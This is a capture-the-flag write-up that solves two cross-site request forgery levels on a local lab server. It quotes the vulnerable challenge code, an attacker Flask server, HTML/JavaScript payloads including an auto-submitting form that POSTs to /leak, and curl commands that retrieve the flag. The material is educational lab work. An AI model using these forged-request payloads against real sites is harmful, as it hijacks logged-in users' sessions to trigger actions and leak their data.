# Cross-Site Request Forgery (CSRF) Vulnerabilities

## Level 11 - Exploit a cross site request forgery vulnerability

Code for this level,

```python
def level11():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f"Invalid `url`, hostname should be `{hacker_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    return "Not Found\n", 404
```

This one requires the `/visit` url to go to `hacker.localhost`, so I write a simple web server listening to that address on port 8080 which redirects to the `/leak`

```python
#!/usr/bin/env python3

from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return redirect("http://challenge.localhost/leak", code=302)

if __name__ == "__main__":
    app.run(host='hacker.localhost', port=8080)
```

I then call `/visit` using that url,

```sh
curl http://challenge.localhost/visit?url=http://hacker.localhost:8080
```

and then get the flag with,

```sh
curl http://challenge.localhost/info?user=1
```

## Level 12 - Exploit a cross site request forgery vulnerability where the request must POST

```python
def level12():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak" and request.method == "POST":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f"Invalid `url`, hostname should be `{hacker_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    return "Not Found\n", 404
```

I can see that I must make a request to the `/visit` endpoint which will call out to a web server I write listening on `http://hacker.localhost:8080` after logging in.

The HTML I return must cause the browser in `/visit` to make a POST request to the `/leak` endpoint and include the session cookies. I've tried returning HTML that contains JavaScript that does the post in an XSS attack. That JavaScript works, but it does not include the session cookies from the previous login.

My web server is as follows, modifying the HTML that is returned,

```python
#!/usr/bin/env python3

from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return '''<html>
    <script>
      // XSS attack
    </script>
    </html>'''

if __name__ == "__main__":
    app.run(host='hacker.localhost', port=8080)
```

I've tried two HTML payloads so far,

```html
<html>
  <script>
    fetch('http://challenge.localhost/leak', {
      method: 'POST',
      credentials: 'include'
    })
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
  </script>
</html>
```

and

```html
<html>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://challenge.localhost/leak', true);
    xhr.withCredentials = true;
    xhr.onload = function () {
        console.log(xhr.responseText);
    };
    xhr.send();
  </script>
</html>
```

Another option is to use an HTML form with an auto-submitting script.

```html
<html>
  <body>
    <form id="leakForm" action="http://challenge.localhost/leak" method="POST">
      <input type="hidden" name="data" value="leak">
    </form>
    <script type="text/javascript">
      document.getElementById('leakForm').submit();
    </script>
  </body>
</html>
```

This works because it is the web page that is submitting the form rather than making a direct request from JavaScript as in my first two attempts.

As in the previous level, I call `/visit` using that url,

```sh
curl http://challenge.localhost/visit?url=http://hacker.localhost:8080
```

and then get the flag with,

```sh
curl http://challenge.localhost/info?user=1
```
